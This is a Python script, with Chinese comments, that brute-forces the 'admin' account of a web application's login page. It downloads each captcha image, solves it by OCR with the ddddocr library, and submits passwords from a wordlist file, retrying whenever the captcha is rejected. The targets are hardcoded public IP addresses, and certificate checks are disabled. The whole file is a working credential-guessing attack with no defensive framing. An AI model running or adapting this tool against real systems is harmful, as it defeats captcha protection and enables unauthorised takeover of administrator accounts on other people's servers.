#
import ddddocr
import requests, json, re, os, time, random


def get_code(url):
    header = {'Cookie': 'PHPSESSID=0'}
    url = url + "/captcha.shtml"
    res = requests.get(url=url, headers=header, verify=False)
    with open("./img2.png", 'wb') as f:
        f.write(res.content)


def img_ocr(img):
    ocr = ddddocr.DdddOcr()  # 实例化
    with open(str(img), 'rb') as f:  # 打开图片
        img_bytes = f.read()  # 读取图片
    res = ocr.classification(img_bytes)  # 识别
    # print(res)
    return res


def baopo(url, p, a):
    url = url + "/admin/common/login.shtml"
    data = "name=admin&password={0}&captcha={1}".format(p, a)
    header = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'PHPSESSID=0',
    }
    res = requests.post(url=url, data=data, headers=header, verify=False)
    result = json.loads(res.text)
    return result


def getCode_OcrCode(url, img):
    zhmodel = re.compile(u'[\u4e00-\u9fa5]')
    get_code(url)
    jieguo = img_ocr(img)
    if jieguo.isdigit() or jieguo.isalnum() and not zhmodel.search(jieguo):
        # print("zheli")
        return jieguo
    else:
        print(jieguo, "404error")
        getCode_OcrCode(url, img)
        print("走到这里")
        print()


def main():
    # url = "http://156.234.62.199/"
    url = "http://47.109.19.59:7070/admin/common/login.shtml"
    img = "captcha.png"
    with open("123.txt", "r") as f:
        for i in range(300):
            p = f.readline().strip()
            # p = p.upper()
            yzm = getCode_OcrCode(url, img)
            time.sleep(0)
            # print(a)
            print("本次密码{0},验证码{1}".format(p, yzm))
            bpjg = baopo(url, p, yzm)
            print(bpjg['msg'])
            if "验证码不正确" in bpjg['msg']:
                yzm = getCode_OcrCode(url, img)
                print("重试1次,本次密码{0},验证码{1}".format(p, yzm))
                bpjg = baopo(url, p, yzm)
                print(bpjg['msg'])
                if "验证码不正确" in bpjg['msg']:
                    yzm = getCode_OcrCode(url, img)
                    print("重试2次,本次密码{0},验证码{1}".format(p, yzm))
                    bpjg = baopo(url, p, yzm)
                    print(bpjg['msg'])
                    if "验证码不正确" in bpjg['msg']:
                        yzm = getCode_OcrCode(url, img)
                        print("重试3次,本次密码{0},验证码{1}".format(p, yzm))
                        bpjg = baopo(url, p, yzm)
                        print(bpjg['msg'])


if __name__ == '__main__':
    main()
